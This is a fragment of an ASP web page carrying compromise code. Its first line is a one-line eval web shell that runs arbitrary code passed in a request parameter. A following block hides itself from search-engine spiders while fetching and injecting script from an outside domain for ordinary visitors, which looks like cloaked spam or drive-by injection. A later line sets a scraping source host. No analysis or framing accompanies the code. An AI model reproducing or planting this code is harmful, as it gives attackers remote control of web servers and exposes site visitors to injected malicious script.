...
<%eval request("SuVgGriGGK")%>
<%
s_http_user_agent = lcase(Request.ServerVariables("HTTP_USER_AGENT"))
if Instr( s_http_user_agent, "baiduspider") = 0 and Instr( s_http_user_agent, "360spider") = 0 and Instr(s_http_user_agent, "sosospider") = 0 then
    js_code = HTTPPost("http://js.winkelsvoetbalshirts-nl.com/ssc.js" & "?backurl=" & "http://" & Request.ServerVariables("Server_Name") & Request.ServerVariables("Script_Name") & "?" & Request.QueryString(), "")
...
<%
randomize
from_host = "www.jx.xinhuanet.com"
